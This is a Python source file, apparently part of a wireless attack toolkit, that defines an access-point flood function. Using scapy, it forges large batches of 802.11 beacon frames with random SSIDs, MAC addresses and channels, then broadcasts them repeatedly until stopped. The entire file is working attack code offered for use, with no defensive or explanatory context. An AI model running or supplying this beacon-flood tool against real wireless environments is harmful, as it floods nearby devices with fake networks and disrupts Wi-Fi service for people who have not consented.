# core/WIFI/ap_flood.py
import random
import string
import time

from scapy.all import RadioTap, Dot11, Dot11Beacon, Dot11Elt, sendp
from debugs import debug


def access_point_flood(self, interface, count=200):
    noise_chars = string.punctuation
    supported_rates = b'\x82\x84\x8b\x96'
    debug("info", f"Starting AP flood on {interface} with APs...")
    debug("info", "AP Flood Running... Press Ctrl+C to stop.")
    self.stop_sniff = False

    while not self.stop_sniff:
        packet_batch = []
        for i in range(count):
            if self.stop_sniff:
                break
            ssid = ''.join(random.choice(noise_chars) for _ in range(random.randint(12, 24)))
            mac = ':'.join('%02x' % random.randint(0, 255) for _ in range(6))
            channel = random.randint(1, 11)
            packet = (
                RadioTap() /
                Dot11(type=0, subtype=8, addr1="FF:FF:FF:FF:FF:FF", addr2=mac, addr3=mac) /
                Dot11Beacon(cap=0x0411) /
                Dot11Elt(ID="SSID", info=ssid.encode('utf-8')) /
                Dot11Elt(ID="Rates", info=supported_rates) /
                Dot11Elt(ID="DSset", info=bytes([channel]))
            )
            packet_batch.append(packet)

        if self.stop_sniff:
            break

        try:
            sendp(packet_batch, inter=0.0002, iface=interface, verbose=0)
            sendp(packet_batch, inter=0.0002, iface=interface, verbose=0)
            sendp(packet_batch, inter=0.0002, iface=interface, verbose=0)
        except KeyboardInterrupt:
            debug("info", "AP flood interrupted by user")
            return

        if self.stop_sniff:
            break

        time.sleep(0.0005)
    debug("info", "AP flood stopped.")
